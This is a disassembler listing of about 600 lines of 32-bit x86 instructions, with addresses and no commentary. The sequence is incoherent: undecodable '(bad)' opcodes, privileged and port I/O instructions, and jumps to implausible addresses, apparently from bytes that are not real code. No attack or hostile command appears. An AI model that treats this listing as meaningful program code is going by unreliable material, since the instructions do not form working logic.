  40c9b5:	add    BYTE PTR [eax],al
  40c9b7:	(bad)  
  40c9b8:	pop    si
  40c9ba:	retf   
  40c9bb:	ret    
  40c9bc:	enter  0x4d8b,0x51
  40c9c0:	pop    edi
  40c9c1:	mov    DWORD PTR [ecx-0x637ac904],0x333574f8
  40c9cb:	pushf  
  40c9cc:	(bad)  
  40c9cd:	call   0x26c81a
  40c9d2:	add    BYTE PTR [ebx+0x3b55bac9],cl
  40c9d8:	in     al,dx
  40c9d9:	add    BYTE PTR [esi+0x2b],dl
  40c9dc:	(bad)  
  40c9dd:	mov    edx,0x858afc
  40c9e2:	clc    
  40c9e3:	xor    esi,DWORD PTR ds:0xe84e9cba
  40c9e9:	add    bh,bh
  40c9eb:	cmp    edi,edi
  40c9ed:	je     0x40c9e7
  40c9ef:	push   ebx
  40c9f0:	pop    es
  40c9f1:	sysexit 
  40c9f3:	leave  
  40c9f4:	dec    ecx
  40c9f5:	bound  edi,QWORD PTR [ebp+ecx*8+0x61]
  40c9f9:	mov    edi,0x76208c7
  40c9fe:	int    0x64
  40ca00:	mov    ecx,0x7660800
  40ca05:	retf   
  40ca06:	add    ax,WORD PTR [eax]
  40ca09:	jne    0x40ca13
  40ca0b:	lea    eax,[eax]
  40ca0d:	add    DWORD PTR [esi-0x9],esp
  40ca10:	ret    
  40ca11:	(bad)  
  40ca12:	inc    edx
  40ca13:	xlat   BYTE PTR ds:[ebx]
  40ca14:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  40ca1a:	add    BYTE PTR fs:[eax],al
  40ca1d:	or     BYTE PTR [esi+0x0],ah
  40ca20:	ret    
  40ca21:	add    cx,bx
  40ca24:	jne    0x40ca68
  40ca26:	lea    eax,[eax]
  40ca28:	add    DWORD PTR [esi-0xf],esp
  40ca2b:	retf   
  40ca2c:	(bad)  
  40ca2d:	mov    edx,0x668400d1
  40ca32:	cmp    al,0xcb
  40ca34:	fs enter 0x7d8a,0x80
  40ca39:	ss xor eax,0x805ff39c
  40ca3f:	je     0x40cabd
  40ca41:	xor    eax,ebx
  40ca43:	inc    eax
  40ca44:	inc    ebp
  40ca45:	add    bl,BYTE PTR [ebx-0x40]
  40ca48:	ss leave 
  40ca4a:	pushf  
  40ca4b:	push   ebp
  40ca4c:	je     0x40ca3a
  40ca4e:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  40ca54:	mov    WORD PTR [esi+0x3c],ss
  40ca57:	and    DWORD PTR [esp+eax*8-0x75],0xc9425fff
  40ca5f:	add    BYTE PTR [ebp+0x57],dl
  40ca62:	in     al,dx
  40ca63:	(bad)  
  40ca64:	push   esi
  40ca65:	mov    edx,0x89360045
  40ca6a:	pushf  
  40ca6b:	cld    
  40ca6c:	mov    esi,0xf874853b
  40ca71:	mov    edx,edx
  40ca73:	or     bh,bh
  40ca75:	ret    0x4566
  40ca78:	or     bl,ch
  40ca7a:	or     BYTE PTR [ebx-0x7699f800],cl
  40ca80:	retf   0x4283
  40ca83:	add    al,BYTE PTR [eax]
  40ca85:	mov    bh,0x66
  40ca87:	adc    dl,cl
  40ca89:	iret   
  40ca8a:	mov    edx,0x66c400c7
  40ca8f:	dec    edx
  40ca91:	(bad)  
  40ca92:	push   edi
  40ca93:	mov    edx,0x66b70057
  40ca98:	mov    edx,0xffdf8df8
  40ca9d:	rcl    BYTE PTR [edi+0x66],0x51
  40caa1:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40caa7:	ret    0x3b
  40caaa:	jne    0x40ca37
  40caac:	mov    DWORD PTR [ebx+0x457218fc],eax
  40cab2:	xor    esi,DWORD PTR ds:0xc7339c8b
  40cab8:	callw  0x5048
  40cabc:	cmp    al,0xf8
  40cabe:	fs inc ebp
  40cac0:	mov    ebx,0x83b35
  40cac5:	pop    es
  40cac6:	sub    ebx,DWORD PTR [esi-0x7675cd45]
  40cacc:	add    al,bh
  40cace:	xor    eax,DWORD PTR [ebp-0x45]
  40cad1:	cmp    eax,0xc7009c4e
  40cad6:	cmp    esi,esp
  40cad8:	jne    0x40ca5f
  40cada:	cmp    eax,0x338545fc
  40cae0:	clc    
  40cae1:	pushf  
  40cae2:	pop    ebx
  40cae3:	mov    eax,DWORD PTR ds:0xeb57c0ec
  40cae9:	push   ecx
  40caea:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  40caf0:	mov    ebx,DWORD PTR [esi-0x74bacdaf]
  40caf6:	psubsb mm1,QWORD PTR [eax]
  40caf9:	icebp  
  40cafa:	lea    ecx,[eax]
  40cafc:	clc    
  40cafd:	pop    es
  40cafe:	inc    ecx
  40cb00:	mov    esi,0x8a72
  40cb05:	push   ebp
  40cb06:	xor    ecx,DWORD PTR [edi]
  40cb08:	mov    edi,0xc24ed1
  40cb0d:	adc    DWORD PTR [ebp+0x0],0x66
  40cb11:	add    bh,al
  40cb13:	inc    ebp
  40cb14:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  40cb1a:	mov    DWORD PTR [ebp+0x8],ecx
  40cb1d:	add    DWORD PTR [ebx],0x66514557
  40cb23:	or     DWORD PTR [edx],0xf32c29e
  40cb29:	cmp    edi,DWORD PTR [esi+esi*2]
  40cb2c:	mov    ecx,DWORD PTR [ebx+0x45f80881]
  40cb32:	dec    DWORD PTR [ebx+0x4db80c33]
  40cb38:	dec    esi
  40cb39:	mov    eax,DWORD PTR [eax]
  40cb3b:	mov    DWORD PTR [ebx],edi
  40cb3d:	mov    esi,DWORD PTR [ebp+0x4]
  40cb40:	xor    ecx,DWORD PTR [eax+0x5f]
  40cb43:	mov    ecx,DWORD PTR [ecx-0x3a87410]
  40cb49:	push   ecx
  40cb4a:	leave  
  40cb4b:	mov    eax,DWORD PTR [eax+edi*8]
  40cb4e:	push   ebp
  40cb4f:	test   ah,ch
  40cb51:	sahf   
  40cb52:	in     al,dx
  40cb53:	xor    al,bh
  40cb55:	mov    esp,ebp
  40cb57:	clc    
  40cb58:	test   DWORD PTR [ebp-0x74baff08],ebx
  40cb5e:	xor    al,0x10
  40cb60:	pushf  
  40cb61:	dec    ebp
  40cb62:	mov    ebp,DWORD PTR [ebx]
  40cb64:	in     al,dx
  40cb65:	mov    edx,DWORD PTR [edi-0xc]
  40cb68:	push   ecx
  40cb69:	icebp  
  40cb6a:	add    eax,0x77208
  40cb6f:	rol    DWORD PTR [ebp+0x72],0xc7
  40cb73:	add    al,dh
  40cb75:	rol    DWORD PTR [ebp+0x4545f827],0x3
  40cb7c:	xor    eax,edi
  40cb7e:	pushf  
  40cb7f:	dec    ebp
  40cb80:	mov    DWORD PTR [ebx],0x985f8fc
  40cb86:	clc    
  40cb87:	or     BYTE PTR [ebp+0x45],al
  40cb8a:	xor    eax,0x7080835
  40cb8f:	pop    es
  40cb90:	dec    ebp
  40cb91:	dec    ebp
  40cb92:	lea    ecx,[ebp+0x72720101]
  40cb98:	add    BYTE PTR [eax],al
  40cb9a:	dec    ebp
  40cb9b:	inc    ebp
  40cb9c:	sub    ebx,0x10518b57
  40cba2:	or     DWORD PTR [ebp-0x62],0x8b8b322b
  40cba9:	cld    
  40cbaa:	adc    cl,dh
  40cbac:	scas   eax,DWORD PTR es:[edi]
  40cbad:	or     BYTE PTR [ebx],bh
  40cbaf:	pop    es
  40cbb0:	xadd   ebp,ebp
  40cbb3:	jb     0x40cbb5
  40cbb5:	add    BYTE PTR [ebx+0x4d2910c1],cl
  40cbbb:	inc    ebp
  40cbbc:	sub    eax,DWORD PTR [ebx]
  40cbbe:	mov    edi,eax
  40cbc0:	lock dec ebp
  40cbc2:	icebp  
  40cbc3:	add    ecx,DWORD PTR [eax]
  40cbc5:	clc    
  40cbc6:	pop    es
  40cbc7:	mov    eax,ecx
  40cbc9:	data16 jb 0x40cbd4
  40cbcc:	add    BYTE PTR [ebp-0x3f],al
  40cbcf:	xor    eax,0x7450830
  40cbd4:	add    ecx,DWORD PTR [ebp-0x8]
  40cbd7:	lea    ecx,[ebp+0x1]
  40cbda:	add    esi,DWORD PTR [edx-0x8]
  40cbdd:	add    BYTE PTR [ecx],dl
  40cbdf:	inc    ebp
  40cbe0:	adc    bl,ch
  40cbe2:	dec    ecx
  40cbe3:	mov    ecx,DWORD PTR [ecx+0x45450408]
  40cbe9:	mov    esi,DWORD PTR ds:0x74d080c
  40cbef:	mov    cl,BYTE PTR [ebp-0x78]
  40cbf2:	lea    ecx,[ebx-0x768d07ff]
  40cbf8:	add    al,bh
  40cbfa:	inc    ebp
  40cbfb:	in     al,0xe9
  40cbfd:	inc    DWORD PTR [eax]
  40cbff:	leave  
  40cc00:	add    BYTE PTR [eax*2-0x71374ab],cl
  40cc07:	push   ecx
  40cc08:	rol    DWORD PTR [ebp+0x4d],0x35
  40cc0c:	sbb    DWORD PTR [edi+edx*2-0x7e07ae39],0x32f89e85
  40cc17:	sar    BYTE PTR [ebx],0x74
  40cc1a:	jbe    0x40cba7
  40cc1c:	mov    edi,esp
  40cc1e:	or     BYTE PTR [edi+0x45],dl
  40cc21:	push   ecx
  40cc22:	mov    eax,DWORD PTR ds:0x4d720c
  40cc28:	mov    eax,DWORD PTR [ebp-0x77]
  40cc2b:	jne    0x40cbb8
  40cc2d:	jmp    0x40cc23
  40cc2f:	mov    edx,DWORD PTR [edi-0x8]
  40cc32:	push   ecx
  40cc33:	push   edi
  40cc34:	mov    edx,DWORD PTR [ecx-0x8]
  40cc37:	add    eax,0x9e7284
  40cc3c:	xor    cl,BYTE PTR [ebp-0x77]
  40cc3f:	sub    edi,eax
  40cc41:	mov    DWORD PTR [ebx+0xc],ebx
  40cc44:	inc    ebp
  40cc45:	inc    ebp
  40cc46:	mov    esi,DWORD PTR ds:0x7c108f8
  40cc4c:	dec    ebp
  40cc4d:	sahf   
  40cc4e:	xor    DWORD PTR [edx],0x8518b57
  40cc54:	or     DWORD PTR [ebp-0x62],0x3beb3288
  40cc5b:	leave  
  40cc5c:	jbe    0x40cc66
  40cc5e:	mov    edx,DWORD PTR [ebp+0x8]
  40cc61:	in     al,dx
  40cc62:	inc    ebp
  40cc63:	in     al,dx
  40cc64:	mov    eax,DWORD PTR [edx]
  40cc66:	or     al,0x0
  40cc68:	dec    ebp
  40cc69:	inc    ebp
  40cc6a:	xor    ax,0x9c09
  40cc6e:	mov    edi,eax
  40cc70:	mov    esi,eax
  40cc72:	cld    
  40cc73:	test   DWORD PTR [edi-0x8],edx
  40cc76:	push   ecx
  40cc77:	inc    ebp
  40cc78:	mov    ecx,DWORD PTR [ebx-0x3f7bf708]
  40cc7e:	sahf   
  40cc7f:	pop    es
  40cc80:	xor    al,al
  40cc82:	mov    DWORD PTR [ebp-0x74e8ff08],esp
  40cc88:	inc    ebp
  40cc89:	or     al,0x3
  40cc8b:	sar    al,0xf2
  40cc8e:	dec    ebp
  40cc8f:	lea    eax,[ebx]
  40cc91:	in     al,0xf8
  40cc93:	dec    DWORD PTR [ecx]
  40cc95:	mov    DWORD PTR [eax],ecx
  40cc97:	cld    
  40cc98:	inc    ebp
  40cc99:	inc    ebp
  40cc9a:	inc    eax
  40cc9b:	mov    DWORD PTR [ebp-0x14],eax
  40cc9e:	jmp    0xff97cae8
  40cca3:	mov    edi,0x70008c2
  40cca8:	mov    eax,edi
  40ccaa:	push   ecx
  40ccab:	sahf   
  40ccac:	(bad)  
  40ccad:	xor    bh,ah
  40ccaf:	add    eax,DWORD PTR [ebp+0x4510f889]
  40ccb5:	inc    ebp
  40ccb6:	xor    al,0xe8
  40ccb8:	pushf  
  40ccb9:	std    
  40ccba:	xor    edi,edi
  40ccbc:	inc    eax
  40ccbd:	fadd   DWORD PTR [eax+0x45]
  40ccc0:	inc    ebp
  40ccc1:	mov    esi,DWORD PTR ds:0x7510814
  40ccc7:	inc    ebp
  40ccc8:	sahf   
  40ccc9:	xor    DWORD PTR [edx],0x8
  40cccc:	cmp    DWORD PTR [ebp+0xc],eax
  40cccf:	mov    eax,DWORD PTR [edx]
  40ccd1:	clc    
  40ccd2:	sub    al,0x40
  40ccd4:	inc    ebp
  40ccd5:	call   0xff49c80f
  40ccda:	pop    es
  40ccdb:	inc    ebp
  40ccdc:	sahf   
  40ccdd:	push   DWORD PTR [edx]
  40ccdf:	adc    BYTE PTR [ebx-0x3717f3ab],cl
  40cce5:	std    
  40cce6:	dec    ebp
  40cce7:	dec    DWORD PTR [ebx+0x5708fcdb]
  40cced:	inc    ebp
  40ccee:	push   ecx
  40ccef:	call   0xffb3c8f9
  40ccf4:	add    BYTE PTR [ebp+0x4d],al
  40ccf7:	xor    eax,DWORD PTR [ebx]
  40ccf9:	add    ecx,DWORD PTR [eax+edx*2]
  40ccfc:	add    DWORD PTR [ebp-0x45],esi
  40ccff:	inc    edx
  40cd01:	cld    
  40cd02:	add    BYTE PTR [ecx],dh
  40cd04:	mov    edi,edi
  40cd06:	or     DWORD PTR [ebx-0x30ff0be4],0xc1f4cec7
  40cd10:	test   DWORD PTR [esi],ebx
  40cd12:	clc    
  40cd13:	inc    ebp
  40cd14:	inc    ebp
  40cd15:	mov    esi,DWORD PTR [ecx+ecx*4]
  40cd18:	pushf  
  40cd19:	or     al,0x8b
  40cd1b:	inc    ebp
  40cd1c:	adc    BYTE PTR [ebx-0x3f7af3bb],cl
  40cd22:	jne    0x40cd5f
  40cd24:	xor    esi,DWORD PTR [ebp-0x17]
  40cd27:	xor    eax,DWORD PTR [eax]
  40cd29:	pop    edi
  40cd2a:	add    BYTE PTR [ebx+0x45],bl
  40cd2d:	ret    0x85
  40cd30:	je     0x40cd77
  40cd32:	push   ebx
  40cd33:	mov    eax,DWORD PTR [ebp-0xe02e8]
  40cd39:	mov    eax,DWORD PTR [ebp-0x75]
  40cd3c:	mov    ecx,DWORD PTR [esp+ecx*1]
  40cd3f:	in     al,dx
  40cd40:	inc    ebp
  40cd41:	or     DWORD PTR [ebx+0x5753f408],0x57
  40cd48:	push   edi
  40cd49:	test   BYTE PTR [ecx+0x0],dl
  40cd4c:	xor    eax,DWORD PTR [eax]
  40cd4e:	mov    esi,0x8472c0
  40cd53:	add    dh,al
  40cd55:	add    BYTE PTR [ebp-0x49],al
  40cd58:	mov    esp,DWORD PTR [eax]
  40cd5a:	or     al,0xc8
  40cd5c:	add    BYTE PTR [ebp-0x1],al
  40cd5f:	xor    ecx,DWORD PTR [ebx+0x8f88b21]
  40cd65:	inc    edx
  40cd66:	inc    eax
  40cd67:	add    bl,ch
  40cd69:	xor    ecx,DWORD PTR [ebx-0x17f7f37f]
  40cd6f:	add    BYTE PTR [ecx+0x45f4f889],cl
  40cd75:	mov    eax,DWORD PTR gs:[eax]
  40cd78:	sub    cl,cl
  40cd7a:	retf   0xff7e
  40cd7d:	mov    WORD PTR [ebp+0x10],cx
  40cd81:	jae    0x40cdf8
  40cd83:	lea    ecx,[ebx+0x63fffcf8]
  40cd89:	xor    edi,edi
  40cd8b:	jne    0x8bcc42de
  40cd91:	or     al,0xfc
  40cd93:	or     al,0x3e
  40cd95:	push   WORD PTR [ecx-0x75]
  40cd99:	jne    0x40cd8b
  40cd9b:	cmpxchg8b QWORD PTR [ecx]
  40cd9e:	(bad)  
  40cd9f:	mov    edx,0x66ec00ff
  40cda4:	jne    0x40cd75
  40cda6:	call   0xff9ec6b7
  40cdab:	cmovge edi,edx
  40cdae:	xor    edi,DWORD PTR [ebx+eax*1]
  40cdb1:	add    BYTE PTR [ebx],bh
  40cdb3:	sub    eax,0xf8b5d74
  40cdb8:	or     al,0xfa
  40cdba:	add    BYTE PTR [edi],cl
  40cdbc:	inc    ebp
  40cdbd:	cmp    al,0x8b
  40cdbf:	mov    ebx,0x4d3b08
  40cdc4:	sub    DWORD PTR [ebx],0x14
  40cdc7:	enterw 0x9ff8,0x3b
  40cdcc:	shl    BYTE PTR [esi+ebx*2+0x6a],0xc9
  40cdd1:	pop    edi
  40cdd2:	or     al,0x45
  40cdd4:	mov    esp,DWORD PTR [esi-0x8]
  40cdd7:	dec    ebp
  40cdd8:	inc    eax
  40cdd9:	data16 jmp 0x40ce29
  40cddc:	push   ebp
  40cddd:	jb     0x40cdcb
  40cddf:	jmp    0x40ce26
  40cde1:	inc    DWORD PTR [ebx+0x7d7f10f8]
  40cde7:	mov    eax,DWORD PTR [eax]
  40cde9:	or     BYTE PTR [esi-0x49],dl
  40cdec:	jo     0x7440ffa1
  40cdf2:	test   DWORD PTR [edx+0xf],eax
  40cdf5:	jmp    DWORD PTR [edi+0xf77000f]
  40cdfb:	inc    DWORD PTR [eax+0x33]
  40cdfe:	mov    ebx,DWORD PTR [edi-0x77]
  40ce01:	pop    ebx
  40ce02:	lock ret 0xd2
  40ce06:	push   ebp
  40ce07:	dec    ebp
  40ce08:	mov    eax,0xf88a81
  40ce0d:	dec    eax
  40ce0f:	ror    ax,0x3b
  40ce13:	rol    BYTE PTR [eax],0x3b
  40ce16:	dec    ebp
  40ce17:	lock adc DWORD PTR [esp+edi*8+0x6a5533eb],0xffffffec
  40ce20:	pop    edi
  40ce21:	in     al,dx
  40ce22:	cmp    edx,DWORD PTR [edi-0xc]
  40ce25:	clc    
  40ce26:	xchg   DWORD PTR fs:[edx-0xff3bff],esi
  40ce2d:	cmp    al,dh
  40ce2f:	jne    0x40cde8
  40ce31:	xor    edi,esp
  40ce33:	jmp    0xcdcf95
  40ce38:	mov    ebp,DWORD PTR [ecx+edi*1]
  40ce3b:	jne    0x40ce3f
  40ce3d:	call   0xfff8cb79
  40ce42:	mov    edi,0x14e97
  40ce47:	add    BYTE PTR [ebx],bh
  40ce49:	inc    edi
  40ce4a:	jne    0x40cdd5
  40ce4c:	mov    esi,DWORD PTR [eax+ecx*1-0x7f7648b9]
  40ce53:	mov    eax,0x8974471f
  40ce58:	mov    edi,DWORD PTR [eax+ecx*1+0x6600b787]
  40ce5f:	add    BYTE PTR [esi+0x88d1f45],bh
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	add    BYTE PTR [eax],al
  40ce68:	mov    bx,di
  40ce6b:	les    esi,FWORD PTR [ebx]
  40ce6d:	xchg   DWORD PTR [esi+0x0],esp
  40ce70:	iret   
  40ce71:	add    BYTE PTR [edx],dl
  40ce73:	inc    ebp
  40ce74:	jl     0x40ce03
  40ce76:	(bad)  
  40ce77:	out    dx,al
  40ce78:	cld    
  40ce79:	add    BYTE PTR [ebx+0x39ccf489],cl
  40ce7f:	xchg   esp,edi
  40ce81:	add    DWORD PTR [eax+eax*1-0x72babafa],ebp
  40ce88:	push   0x32
  40ce8a:	pop    edi
  40ce8b:	add    BYTE PTR [ebp-0x77],dh
  40ce8e:	paddq  mm1,mm2
  40ce91:	xchg   DWORD PTR [ecx+eax*1],edi
  40ce94:	add    BYTE PTR [eax],al
  40ce96:	adc    ecx,DWORD PTR [ecx+0x457cb083]
  40ce9c:	test   eax,ebp
  40ce9e:	inc    DWORD PTR [eax]
  40cea0:	inc    DWORD PTR [eax]
  40cea2:	ror    BYTE PTR [ebx+0xc9a85e],0x8
  40cea9:	dec    DWORD PTR [ebx-0x3e020718]
  40ceaf:	inc    esp
  40ceb1:	inc    ebp
  40ceb2:	inc    DWORD PTR [ebp-0x52ccf0cd]
  40ceb8:	data16 add BYTE PTR [ebp-0x75],cl
  40cebc:	(bad)  
  40cebe:	rcl    BYTE PTR [esi-0x1e],0x74
  40cec2:	mov    edi,DWORD PTR [eax-0x7d]
  40cec5:	lock push eax
  40cec7:	jle    0x40ce54
  40cec9:	mov    ecx,DWORD PTR [ebx+0x56a81c]
  40cecf:	mov    eax,DWORD PTR [ebx+0x7f80018]
  40ced5:	jge    0x40ce97
  40ced7:	mov    esi,DWORD PTR [eax]
  40ced9:	adc    al,0x0
  40cedb:	enter  0xd06a,0xff
  40cedf:	dec    ebp
  40cee0:	or     BYTE PTR [ecx+0x7dffe4c1],cl
  40cee6:	mov    edi,DWORD PTR [ebx]
  40cee8:	lods   al,BYTE PTR ds:[esi]
  40cee9:	ja     0x40ceeb
  40ceeb:	mov    DWORD PTR [ebp+0x45db22f8],ecx
  40cef1:	pop    ebp
  40cef2:	lea    edi,[ecx]
  40cef4:	inc    esp
  40cef5:	clc    
  40cef6:	inc    ebp
  40cef7:	outs   dx,BYTE PTR ds:[esi]
  40cef8:	lea    eax,[ebx]
  40cefa:	push   bp
  40cefc:	inc    ebp
  40cefd:	mov    ecx,DWORD PTR [ebp+0xb788e0]
  40cf03:	pop    edi
  40cf04:	mov    DWORD PTR [esi-0x40],ebx
  40cf07:	jae    0x40ce90
  40cf09:	cmp    eax,DWORD PTR [eax]
  40cf0b:	adc    al,0x0
  40cf0d:	pop    eax
  40cf0e:	inc    ebp
  40cf0f:	sbb    al,0x8d
  40cf11:	mov    ecx,esp
  40cf13:	or     BYTE PTR [eax],al
  40cf15:	cmp    al,0x89
  40cf17:	mov    eax,ecx
  40cf19:	cld    
  40cf1a:	xchg   DWORD PTR [ebp+0x0],edx
  40cf1d:	add    eax,DWORD PTR [eax]
  40cf1f:	add    eax,DWORD PTR [ebp+0x2b]
  40cf22:	lea    ecx,[eax]
  40cf24:	adc    BYTE PTR [ebp+0x0],al
  40cf27:	or     ecx,DWORD PTR [ecx-0x78763000]
  40cf2d:	fadd   QWORD PTR [ecx]
  40cf2f:	push   ebp
  40cf30:	add    BYTE PTR [ebx+0x1b8d0045],al
  40cf36:	push   esp
  40cf37:	inc    ebp
  40cf38:	add    bh,bh
  40cf3a:	push   edi
  40cf3b:	adc    BYTE PTR [ebp-0x18],bh
  40cf3e:	mov    ebp,edi
  40cf40:	fdivr  st,st(7)
  40cf42:	cli    
  40cf43:	dec    ebp
  40cf44:	add    BYTE PTR [ebp-0x74788bb0],al
  40cf4a:	add    esp,edi
  40cf4c:	add    BYTE PTR [eax],bh
  40cf4e:	xor    BYTE PTR [ebp-0x51],al
  40cf51:	cmp    edi,0xfffffffc
  40cf54:	mov    edi,edi
  40cf56:	lock in al,dx
  40cf58:	rcl    ah,0x84
  40cf5b:	pop    ebp
  40cf5c:	add    BYTE PTR [ebx+0x0],al
  40cf5f:	pop    ebp
  40cf60:	dec    eax
  40cf61:	cmp    edx,DWORD PTR [ebx-0x8]
  40cf64:	mov    edx,DWORD PTR [ecx+eax*1-0x7436fca5]
  40cf6b:	add    al,0x24
  40cf6d:	push   ebp
  40cf6e:	dec    esi
  40cf6f:	in     al,dx
  40cf70:	mov    eax,DWORD PTR [ebp+0x20]
  40cf73:	push   esi
  40cf74:	pop    esi
  40cf75:	mov    al,0x3
  40cf77:	add    DWORD PTR [ecx+0x7eb0e000],ecx
  40cf7d:	add    DWORD PTR [ebx],eax
  40cf7f:	add    BYTE PTR [ebx],al
  40cf81:	inc    ebp
  40cf82:	mov    eax,ebp
  40cf84:	hlt    
  40cf85:	(bad)  
  40cf86:	push   ebp
  40cf87:	dec    DWORD PTR [ecx-0x4fe07f2]
  40cf8d:	push   es
  40cf8e:	add    ecx,ecx
  40cf90:	pop    ebp
  40cf91:	or     BYTE PTR [ebx],dh
  40cf93:	jns    0x5e02b85a
  40cf99:	ret    0x76
  40cf9c:	jmp    0x40cf2d
  40cf9e:	mov    eax,DWORD PTR [ecx]
  40cfa0:	in     al,0x0
  40cfa2:	jge    0x40cf8f
  40cfa4:	sysexit 
  40cfa6:	cmp    al,0x8a
  40cfa8:	cmp    eax,DWORD PTR [eax]
  40cfaa:	sbb    BYTE PTR [eax],cl
  40cfac:	pop    ebp
  40cfad:	add    BYTE PTR [esi+0x66],bh
  40cfb0:	jae    0x40cfb3
  40cfb2:	mov    eax,ecx
  40cfb4:	call   0xb9b7:0x8b025583
  40cfbb:	mov    ebx,0x8d4e55
  40cfc0:	mov    al,0x3b
  40cfc2:	fdiv   DWORD PTR [ebp-0x8]
  40cfc5:	xor    edx,DWORD PTR [ebp+0x66]
  40cfc8:	mov    DWORD PTR [ecx],0x10087ec
  40cfce:	add    BYTE PTR [eax],al
  40cfd0:	push   ebp
  40cfd1:	ret    
  40cfd2:	mov    ecx,DWORD PTR [ebx-0x77c57404]
  40cfd8:	jne    0x40cfda
  40cfda:	mov    eax,ecx
  40cfdc:	fadd   QWORD PTR [esi]
  40cfde:	xor    al,0xc7
  40cfe0:	push   ebx
  40cfe1:	or     dh,dh
  40cfe3:	icebp  
  40cfe4:	inc    DWORD PTR [eax+0x8f4358b]
  40cfea:	rol    BYTE PTR [edx+0x5],0xa
  40cfee:	inc    ebp
  40cfef:	stc    
  40cff0:	mov    DWORD PTR [ebp-0x75],esi
  40cff3:	(bad)  
  40cff4:	lock add BYTE PTR [ebp-0x7a],al
  40cff8:	add    al,0x1
  40cffa:	dec    ebp
  40cffb:	add    BYTE PTR [ebp-0x39],dh
  40cffe:	mov    eax,ebx
  40d000:	call   0xe8c45990
  40d005:	sbb    al,0x5d
  40d007:	mov    edi,0xf85e8572
  40d00c:	pop    edi
  40d00d:	jge    0x40cfd1
  40d00f:	lea    eax,[eax]
  40d011:	dec    DWORD PTR [ebx+0x88b8b45]
  40d017:	or     bh,bh
  40d019:	leave  
  40d01a:	fadd   DWORD PTR [eax+eax*1-0x67ff7300]
  40d021:	dec    ebp
  40d022:	add    BYTE PTR [ebp-0xff7f075],al
  40d028:	xchg   ebp,eax
  40d029:	add    bh,bh
  40d02b:	mov    ecx,DWORD PTR [ebx-0x74b276f0]
  40d031:	mov    esi,DWORD PTR [ebx]
  40d033:	or     al,0x39
  40d035:	dec    ebp
  40d036:	pop    esi
  40d037:	mov    edx,DWORD PTR [ebp+0x5d458b08]
  40d03d:	in     al,0x4
  40d03f:	pushf  
  40d040:	mov    ecx,DWORD PTR [ecx-0x76ff1378]
  40d046:	push   ebx
  40d047:	call   0xc83595f
  40d04c:	add    BYTE PTR [ebp+0x5],cl
  40d04f:	(bad)  
  40d050:	cmp    edx,DWORD PTR [eax]
  40d052:	add    BYTE PTR [ebp+0x5783f889],al
  40d058:	add    dl,BYTE PTR [ecx-0x3e]
  40d05b:	mov    ebx,0xff028d0f
  40d060:	mov    edx,0x66330045
  40d065:	mov    eax,ebx
  40d067:	sub    esp,eax
  40d069:	add    eax,eax
  40d06b:	clc    
  40d06c:	mov    DWORD PTR [ebx-0x7477ff75],edx
  40d072:	add    BYTE PTR [ebx+ebx*2],cl
  40d075:	dec    ebp
  40d076:	push   edi
  40d077:	xor    edi,eax
  40d079:	xor    eax,DWORD PTR [esi+0x8018d]
  40d07f:	in     eax,0xe7
  40d081:	add    BYTE PTR [ebx],al
  40d083:	inc    ebp
  40d084:	jmp    0x40d0b9
  40d086:	xor    bh,0x49
  40d089:	mov    ebp,ecx
  40d08b:	adc    BYTE PTR [eax-0x75ccbfb3],cl
  40d091:	xor    eax,DWORD PTR [eax-0x10c483d5]
  40d097:	jne    0x40d099
  40d099:	mov    ecx,DWORD PTR [ebx+0x458808]
  40d09f:	mov    eax,DWORD PTR [ebx]
  40d0a1:	hlt    
  40d0a2:	pop    edi
  40d0a3:	add    BYTE PTR [ebp-0x37],dl
  40d0a6:	in     al,dx
  40d0a7:	push   es
  40d0a8:	in     al,dx
  40d0a9:	dec    ecx
  40d0aa:	push   edi
  40d0ab:	xor    eax,0x4d9c1735
  40d0b0:	mov    DWORD PTR [eax+0x624757e8],eax
  40d0b6:	mov    ecx,edx
  40d0b8:	in     al,0x4d
  40d0ba:	dec    ebp
  40d0bb:	add    BYTE PTR [ebp-0x43df0a9],0xe9
  40d0c2:	add    dl,dl
  40d0c4:	mov    ecx,DWORD PTR [ebx+0x4dc9080c]
  40d0ca:	test   BYTE PTR [eax+0x8008b00],cl
  40d0d0:	dec    ebp
  40d0d1:	push   ebp
  40d0d2:	mov    DWORD PTR [eax+0x4d72f4],edi
  40d0d8:	mov    eax,ecx
  40d0da:	clc    
  40d0db:	into   
  40d0dc:	dec    ebp
  40d0dd:	retf   0x18c7
  40d0e0:	lock dec ebp
  40d0e2:	test   DWORD PTR [ebx-0x31baf308],ecx
  40d0e8:	push   ebx
  40d0e9:	(bad)  
  40d0ea:	jge    0x40d0b6
  40d0ec:	push   esi
  40d0ed:	enter  0xce45,0x89
  40d0f1:	dec    ebp
  40d0f2:	cld    
  40d0f3:	jmp    0xff74d03d
  40d0f8:	pushf  
  40d0f9:	inc    ebp
  40d0fa:	mov    esi,0x78b0833
  40d0ff:	sub    esp,DWORD PTR [edx+0x3]
  40d102:	int    0x8
  40d104:	mov    ecx,DWORD PTR [ebp+0xc]
  40d107:	mov    eax,esi
  40d109:	adc    bl,cl
  40d10b:	(bad)  
  40d10c:	enter  0x4d85,0xff
  40d110:	jmp    0x85d214
  40d115:	xor    eax,DWORD PTR [ebp+0x5e]
  40d118:	mov    ebp,ebx
  40d11a:	or     al,0x8b
  40d11c:	(bad)  
  40d11d:	call   0x51cd28f0
  40d122:	cmp    al,0x5
  40d124:	fs jb  0x40d0b2
  40d127:	add    BYTE PTR [eax],cl
  40d129:	leave  
  40d12a:	ror    BYTE PTR [ecx+esi*8],cl
  40d12d:	push   ebp
  40d12e:	inc    ebp
  40d12f:	in     al,dx
  40d130:	mov    ebp,esp
  40d132:	or     al,0xc7
  40d134:	(bad)  
  40d135:	lock into 
  40d137:	test   ecx,eax
  40d139:	clc    
  40d13a:	rol    BYTE PTR [ebp+0x34],1
  40d13d:	xor    al,0x45
  40d13f:	pushf  
  40d140:	add    ecx,DWORD PTR [ebx-0x7b27604]
  40d146:	mov    al,BYTE PTR [ebp-0x7b]
  40d149:	cmp    eax,0x56349c75
  40d14e:	sub    al,0xc7
  40d150:	jmp    0x40d13e
  40d152:	mov    ebx,DWORD PTR [eax]
  40d154:	lock jmp 0xf02a:0x8bb27df1
  40d15c:	mov    edx,DWORD PTR [edi-0x14]
  40d15f:	push   ecx
  40d160:	icebp  
  40d161:	xor    eax,DWORD PTR [edx]
  40d163:	mov    edx,0x627280
